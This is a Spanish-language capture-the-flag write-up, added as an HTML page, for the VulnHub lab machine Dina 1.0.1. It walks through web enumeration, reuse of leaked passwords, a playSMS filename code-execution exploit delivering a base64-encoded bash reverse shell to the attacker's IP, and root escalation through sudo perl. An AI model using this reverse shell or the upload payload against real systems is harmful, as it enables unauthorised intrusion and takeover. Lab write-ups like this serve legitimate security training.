@@ -1,0 +1,203 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Dina 1.0.1 VulnHub</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://avatars.githubusercontent.com/u/95899548?v=4">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Dina 1.0.1 VulnHub" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Dina 1.0.1 de la plataforma de VulnHub" />
+<meta property="og:description" content="Resolución de la máquina Dina 1.0.1 de la plataforma de VulnHub" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Dina 1.0.1 VulnHub" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Dina 1.0.1 VulnHub" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Dina 1.0.1 de la plataforma de VulnHub","headline":"Writeup Dina 1.0.1 Vulnhub","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Dina 1.0.1 VulnHub</h1>
+          <p>Resolución de la máquina Dina 1.0.1 de la plataforma de VulnHub</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ nmap</span><span class="p"> 192.168.100.10
+Nmap scan report for 192.168.100.10
+PORT   STATE SERVICE
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Si damos un vistazo a la web encontramos esto</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Buscando directorios podemos ver secure y nothing entre otros</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ gobuster</span><span class="p"> dir -u 192.168.100.10 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100
+===============================================================
+[+] Threads:                 100
+[+] Url:                     http://192.168.100.10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/tmp                  (Status: 301) [Size: 314] [--> http://192.168.100.10/tmp/]
+/uploads              (Status: 301) [Size: 318] [--> http://192.168.100.10/uploads/]
+</span><span class="kd">/nothing</span><span class="p">              (Status: 301) [Size: 318] [--> http://192.168.100.10/nothing/]</span>
+</span><span class="kd">/secure</span><span class="p">               (Status: 301) [Size: 317] [--> http://192.168.100.10/secure/]
+</code></pre></div></div>
+
+<div><p>Si damos un vistazo con curl a nothing podemos ver lo que parecen ser contraseñas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ curl</span><span class="p"> http://192.168.100.10/nothing/
+&lthtml>
+&lthead>&lttitle>404 NOT FOUND&lt/title>&lt/head>
+&ltbody>
+&lt!--
+#my secret pass
+</span><span class="kd">freedom
+password
+helloworld!
+diana
+iloveroot</span><span class="p">
+-->
+&lth1>NOT FOUND&lt/html>
+&lth3>go back&lt/h3>
+&lt/body>
+&lt/html></span>
+</code></pre></div></div>
+
+<div><p>Es el turno de secure, en este caso encontramos un .zip, asi que lo descargamos</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Al descomprimir nos pide contraseña pero podemos reutilizar las encontradas en nothing</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ 7z</span><span class="p"> x backup.zip
+Extracting archive: backup.zip
+Enter password (will not be echoed): </span><span class="kd">freedom</span><span class="p">
+Everything is Ok
+Size:       176
+Compressed: 336
+</span><span class="s2">❯ ls
+</span><span class="kd"> backup-cred.mp3</span><span class="p">   backup.zip</span>
+</code></pre></div></div>
+
+<div><p>De primeras vemos un mp3, pero file nos dice que es un texto, si le damos un vistazo con cat encontramos un usuario para /SecreTSMSgatwayLogin</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ file</span><span class="p"> backup-cred.mp3
+backup-cred.mp3: ASCII text
+</span><span class="s2">❯ cat</span><span class="p"> backup-cred.mp3
+
+I am not toooo smart in computer .......
+dat the resoan i always choose easy password...
+with creds backup file....
+
+uname: </span><span class="kd">touhid</span><span class="p">
+password: ******
+url : </span><span class="kd">/SecreTSMSgatwayLogin</span>
+</code></pre></div></div>
+
+<div><p>Reutilizando las contraseñas en nothing logramos iniciar sesión con "diana" como contraseña</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Si buscamos vulnerabilidades para playsms encontramos una de RCE en sendfromfile</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ searchsploit</span><span class="p"> -x 42003.txt
+&lt.......................................>
+Code Execution using $filename if the user renames the file to
+"&lt?php system('uname -a'); dia();?>.php"
+the den server checks the file and sets some parameters 
+$filename="&lt? php system ('uname -a'); day();?>.php"</span>
+</code></pre></div></div>
+
+<div><p>Podemos ejecutar php en el filename, entonces creamos uno con una reverse shell a nuestra ip</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ echo </span><span class="no">"bash -i >& /dev/tcp/192.168.100.9/443 0>&1"</span><span class="p"> |</span><span class="s2"> base64
+</span><span class="p">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC45LzQ0MyAwPiYxCg==
+</span><span class="s2">❯ touch </span><span class="no">"&lt?php shell_exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC45LzQ0MyAwPiYxCg== | base64 -d | bash'); ?>.php"</span>
+</code></pre></div></div>
+
+<div><p>Creado el archivo, podemos subirlo en MyAccount|Send From File</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Al darle a upload file, recibimos la shell en nuestro listener</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ sudo netcat</span><span class="p"> -lvnp 443
+Connection received on 192.168.100.10
+</span><span class="s2">www-data@Dina</span><span class="p">:</span><span class="na">~/SecreTSMSgatwayLogin</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@Dina</span><span class="p">:</span><span class="na">~/SecreTSMSgatwayLogin</span><span class="p">$  hostname -I
+192.168.100.10
+</span><span class="s2">www-data@Dina</span><span class="p">:</span><span class="na">~/SecreTSMSgatwayLogin</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si miramos los sudoers encontramos que podemos ejecutar perl como root sin contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >www-data@Dina</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+Matching Defaults entries for www-data on this host:
+    env_reset,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/bin
+
+User www-data may run the following commands on this host:
+    (ALL) NOPASSWD: /usr/bin/perl
+</span><span class="s2">www-data@Dina</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En <a href="https://gtfobins.github.io/">gtfobins</a> encontramos un payload, ejecutamos su y nos convertimos en root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >www-data@Dina</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo perl -e "exec 'su'"
+</span><span class="s2">root@Dina</span><span class="p">:</span><span class="na">/var/www</span><span class="p"># cd
+</span><span class="s2">root@Dina</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@Dina</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+192.168.100.10 
+</span><span class="s2">root@Dina</span><span class="p">:</span><span class="na">~</span><span class="p"># cat flag.txt
+________                                                _________
+\________\--------___       ___         ____----------/_________/
+    \_______\----\\\\\\   //_ _ \\    //////-------/________/
+        \______\----\\|| (( ~|~ )))  ||//------/________/
+            \_____\---\\ ((\ = / ))) //----/_____/
+                 \____\--\_)))  \ _)))---/____/
+                       \__/  (((     (((_/
+                          |  -)))  -  ))
+
+root password is : hello@3210
+easy one .....but hard to guess.....
+but i think u dont need root password......
+u already have root shelll....
+
+CONGO.........
+FLAG : 22d06624cd604a0626eb5a2992a6f2e6
+
+</span><span class="s2">root@Dina</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
